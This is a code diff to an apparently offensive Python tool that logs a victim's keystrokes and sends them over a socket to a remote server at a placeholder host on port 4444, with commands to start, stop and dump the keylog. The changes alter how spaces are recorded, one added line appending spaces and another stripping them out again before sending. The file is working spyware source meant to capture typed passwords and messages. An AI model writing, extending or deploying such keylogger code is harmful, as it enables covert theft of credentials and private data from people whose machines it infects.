@@ -8,7 +8,7 @@ from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
 import string
 
-HOST = 'your-server-ip'  # <-- Replace with your actual server IP
+HOST = 'your-server-ip'  # <-- Replace with your server IP
 PORT = 4444
 
 keylog_active = False
@@ -40,13 +40,12 @@ def keylogger():
 
         if name in ['shift', 'ctrl', 'alt', 'caps lock', 'tab', 'esc', 'backspace']:
             return
-        elif name == 'space':
-            return
         elif name == 'enter':
             keylog_buffer.append('[enter]')
         elif len(name) == 1 and name in string.printable:
             keylog_buffer.append(name)
-        # Ignore non-printable or modifier keys
+        elif name == 'space':
+            keylog_buffer.append(' ')  # space is recognized but not printed
 
     keyboard.on_press(on_key)
 
@@ -97,8 +96,8 @@ def handle_server(conn):
                 keylog_active = False
                 conn.send(b"Keylogger stopped.\n")
             elif cmd == "keydump":
-                output = ''.join(keylog_buffer)
-                conn.send(f"KeyDumper: {output}\n".encode())
+                filtered = ''.join(keylog_buffer).replace(' ', '')
+                conn.send(f"KeyDumper: {filtered}\n".encode())
             else:
                 conn.send(b"Unknown command.\n")
         except Exception as e:
